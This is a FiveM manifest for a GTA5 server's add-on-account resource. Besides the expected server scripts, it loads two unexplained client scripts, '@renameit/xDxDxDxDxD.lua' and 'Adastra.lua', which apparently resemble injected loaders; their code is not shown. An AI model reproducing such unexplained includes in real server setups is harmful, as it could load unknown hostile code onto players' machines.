fx_version('bodacious')
game('gta5')

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/classes/addonaccount.lua',
	'server/main.lua'
}

dependency('es_extended')

client_script '@renameit/xDxDxDxDxD.lua'

client_script 'Adastra.lua'